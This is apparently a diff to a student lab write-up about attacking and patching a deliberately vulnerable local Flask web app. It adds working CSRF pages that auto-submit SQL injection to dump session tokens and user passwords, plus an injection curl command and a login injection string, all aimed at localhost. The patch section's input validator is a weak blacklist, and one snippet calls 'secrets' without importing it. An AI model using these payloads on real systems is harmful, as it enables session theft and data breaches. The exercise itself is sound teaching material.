@@ -55,6 +55,39 @@ Authors:
 > curl -L 'http://0.0.0.0:5000/logout'  -H "Cookie: session_token=' UNION SELECT 1 AS id, 'maldev' AS username FROM users --"
 > ```
 
+>[!IMPORTANT]
+>**CSRF (Cross Site Request Forgery)**  
+>
+> Create `malicious.html` where a form calls the post method on an endpoint with an SQL injection as the message.
+> ```
+><html>
+><body>
+>    <h1>CSRF Payload</h1>
+>    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+>        <input type="hidden" name="message" value="1&#39;, 1&#41;, ((SELECT GROUP_CONCAT(user || ':' || token, '&#8249;br>') FROM sessions), 1)--">
+>    </form>
+>    <script>
+>        // Automatically submit the form when the page loads
+>        document.getElementById('csrfForm').submit();
+>    </script>
+></body>
+></html>
+> ```
+> or 
+> ```
+> <html>
+><body>
+>    <h1>CSRF Payload</h1>
+>    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+>        <input type="hidden" name="message" value="1', 1&#41;, ((SELECT >GROUP_CONCAT(id || ',' || username || ':' || password, '&#8249;br>') FROM users), 1)--">
+>    </form>
+>    <script>
+>        // Automatically submit the form when the page loads
+>        document.getElementById('csrfForm').submit();
+>    </script>
+></body>
+></html>
+> ```
 **SUMMARY**
 
 The web server is vulnerable mostly to SQL injection attacks due to the incorrect implementation of SQL queries.
@@ -582,8 +615,142 @@ curl -L 'http://0.0.0.0:5000/logout' -H "Cookie: session_token=' UNION SELECT 1 
 
 This vulnerability might give a hint to CSRF (Cross-Site Request Forgery) attack.
 
+### CRSF (Cross-Site Request Forgery)
+
+Earlier, we were talking about using the attacker's own machines and the server database to commit cyber attacks to the website.
+
+But, there is a way to make the user perform the attack themselves.
+
+With the use of a malicious website, the attacker can trick the user to perform the attack by clicking on a link or inputting something in the site. This bypasses the security made by the website by utilizing the trust of the website to the user's browser and its authenticity.
+
+The attack is done by making a simple website like this:
+
+>```
+> <html>
+><body>
+>    <h1>CSRF Payload</h1>
+></body>
+></html>
+> ```
+
+Then the attacker adds a form or a button with an action that references to the API endpoint and specifies the method.
+
+>```
+><form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+></form>
+>```
+
+If the attackers choose the form method, the attacker will add an input with the value of the SQL query to be run inside the API endpoint.
+
+>```
+> <input type="hidden" name="message" value="1&#39;, 1&#41;, ((SELECT GROUP_CONCAT(user || ':' || token, '&#8249;br>') FROM sessions), 1)--">
+>```
+
+The attacker may also choose to add a script that auto submits the form when the page is loaded.
+
+>```
+> <script>
+>    document.getElementById('csrfForm').submit();
+> </script>
+>```
+
+The SQL queries used in the example above is simply the SQL injection queries introduced before.
 
 
 ## Patching the vulnerabilities
+So this is how attackers may easily access and manipulate the data inside your website.
 
-change code bro
+You may ask the question, how do we fix these security vulnerabilities?
+
+We patch them, of course! Using various security tricks and methods, we are able to secure our website against these malicious attacks.
+
+To combat SQL injections, we changed how we pass values into the SQL queries from concatenation into input parametization, as shown below:
+```
+res = cur.execute("SELECT id from users WHERE username = '"
+            + request.form["username"]
+            + "' AND password = '"
+            + request.form["password"] + "'")
+```
+
+into
+
+```
+res = cur.execute("SELECT id from users WHERE username = ? AND password = ?", (request.form["username"], request.form["password"]))
+```
+
+This makes it so that each "?" needs to have a value to succeed, and just inputting one value will just send an error.
+
+But this still has some flaws.
+
+Both input fields are still able to be inputted with SQL injections, which makes it not that secure.
+
+Example of this would be the SQL Injection to access Alice's account.
+
+>```
+>"username=' UNION SELECT id FROM users; --&password="
+>```
+
+
+We can implement character limitations and exclude special characters in the input fields for the login to combat this.
+
+An example for this input validator would be something like this:
+
+>```
+>def input_validation(data):
+>    for elem in data:
+>        if elem == "session_token":
+>            val = request.cookies.get(elem)
+>            if ' ' in val or '--' in val or len(val) == 0:
+>                return False
+>        elif elem != "message":
+>            val = request.form[elem]
+>            if ' ' in val or len(val) == 0:
+>                return False
+>    return True
+>```
+But how about when posting a comment? We cannot limit the users from using special characters or have a short limit on characters when commenting.
+
+So what can we do?
+
+Well, still remember the input parametization? It solves the problem of the post message by itself, so there is no worry about that.
+
+Another problem in the code is the CRSF attack using another malicious website.
+
+We cannot use input parametization nor input cleaning to patch this vulnerability. So we use the good 'ol CRSF token that is passed together when posting a message.
+
+To implement this security measure, we need to use the library `hashlib` and the modules `session` and `abort` in the `Flask` library.
+
+>```
+>import hashlib
+>from flask import session, abort
+>```
+
+Then, we need to create a secret key for our application, something like this:
+
+>```
+>app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
+>```
+
+We also create a function to generate the CRSF function to be used:
+
+>```
+>def generate_csrf_token():
+>   if 'csrf_token' not in session:
+>        session['csrf_token'] = hashlib.sha256(secrets.token_bytes(32)).hexdigest()
+>   return session['csrf_token']
+>```
+
+To implement this in our `/posts` endpoint, we add a CRSF validator before we apply `INSERT`:
+
+>```
+>if user:
+>        if request.form.get('csrf_token') != session.pop('csrf_token', None):
+>             abort(403)
+>           
+>        cur.execute("INSERT INTO posts (message, user) VALUES (?,?);",
+>                     (request.form["message"], str(user[0])))
+>        con.commit()
+>        return redirect("/home")
+>```
+
+Voila! We prevented CRSF attacks using this CRSF token security measure.
